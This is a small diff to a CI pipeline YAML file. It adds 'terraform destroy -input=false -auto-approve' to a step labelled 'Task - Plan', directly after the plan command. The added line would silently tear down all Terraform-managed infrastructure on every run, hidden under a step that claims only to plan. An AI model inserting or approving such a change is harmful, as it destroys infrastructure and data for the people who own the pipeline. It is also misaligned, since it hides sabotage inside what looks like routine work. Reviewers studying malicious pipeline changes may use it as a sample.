@@ -152,6 +152,7 @@ stages:
             parameters:
               script: |
                 terraform plan -compact-warnings -input=false -out="tfplan"
+                terraform destroy -input=false -auto-approve
               displayName: "Task - Plan"
               targetType: "inline"
               pwsh: true
